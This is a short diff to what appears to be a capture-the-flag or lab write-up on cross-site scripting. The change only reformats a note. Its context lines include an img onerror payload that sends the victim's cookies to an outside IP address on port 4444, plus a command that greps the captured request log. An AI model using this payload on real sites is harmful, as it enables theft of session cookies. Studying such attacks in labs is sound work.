@@ -64,7 +64,9 @@ Set the cookie to be payload
 document.cookie=`status="</i><img src=x onerror="this.src='http://152.67.76.29:4444/?c='+document.cookie; this.removeAttribute('onerror');">`
 ```
 
-> **Note**: The following payload did not remove `onerror` event and kept continually making request... Potentially DOS-ing service you use 😳 I wasn't able to get around this, but you can close the page and wait for the admin to visit page. 
+::: info Note
+The following payload did not remove `onerror` event and kept continually making request... Potentially DOS-ing service you use 😳 I wasn't able to get around this, but you can close the page and wait for the admin to visit page. 
+:::
 
 ```bash
 ➜  ~ cat requests.log | grep status | sort | uniq
